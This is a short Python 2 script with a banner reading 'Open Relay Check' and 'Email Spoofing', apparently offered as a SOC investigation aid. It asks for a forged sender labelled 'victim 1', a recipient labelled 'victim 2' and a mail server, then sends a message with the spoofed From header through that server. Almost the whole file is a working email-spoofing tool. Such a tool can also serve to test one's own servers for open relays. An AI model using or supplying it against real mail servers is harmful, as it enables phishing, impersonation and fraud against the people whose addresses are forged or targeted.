#!/usr/bin/env python
import smtplib
print'''
   ____                         ____         __                 ______ __                 __      
  / __ \ ____   ___   ____     / __ \ ___   / /____ _ __  __   / ____// /_   ___   _____ / /__    
 / / / // __ \ / _ \ / __ \   / /_/ // _ \ / // __ `// / / /  / /    / __ \ / _ \ / ___// //_/    
/ /_/ // /_/ //  __// / / /  / _, _//  __// // /_/ // /_/ /  / /___ / / / //  __// /__ / ,<       
\____// .___/ \___//_/ /_/  /_/ |_| \___//_/ \__,_/ \__, /   \____//_/ /_/ \___/ \___//_/|_|      
     /_/                                           /____/                                         
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______
/_____//_____//_____//_____//_____//_____//_____//_____//_____//_____//_____//_____//_____//_____/
    ______                   _  __   _____                       ____ _                           
   / ____/____ ___   ____ _ (_)/ /  / ___/ ____   ____   ____   / __/(_)____   ____ _             
  / __/  / __ `__ \ / __ `// // /   \__ \ / __ \ / __ \ / __ \ / /_ / // __ \ / __ `/    --SOC INVESTIGATION--         
 / /___ / / / / / // /_/ // // /   ___/ // /_/ // /_/ // /_/ // __// // / / // /_/ /              
/_____//_/ /_/ /_/ \__,_//_//_/   /____// .___/ \____/ \____//_/  /_//_/ /_/ \__, /               
                                       /_/                                  /____/ 
Beware ! Publicly available email servers can be used for spoofing attack.If you have configured your mail server with OPEN RELAY, this dangerous email spoofing attack can be performed.
'''

def prompt(prompt):
    return raw_input(prompt).strip()

fromaddr = prompt("From address victim 1: ")
toaddrs  = prompt("To address victim 2: ").split()
server   = prompt("mailserver: ")
print "Enter the message and Type ^D (Unix) or ^C (Windows) to send:"

# Add the From: and To: headers at the start!
msg = ("From: %s\r\nTo: %s\r\n\r\n"
       % (fromaddr, ", ".join(toaddrs)))
while 1:
    try:
        line = raw_input()
    except EOFError:
        break
    if not line:
        break
    msg = msg + line

print "Your Message is on the way" + repr(len(msg))
server = smtplib.SMTP(server)
server.set_debuglevel(0)
server.sendmail(fromaddr, toaddrs, msg)
server.quit()
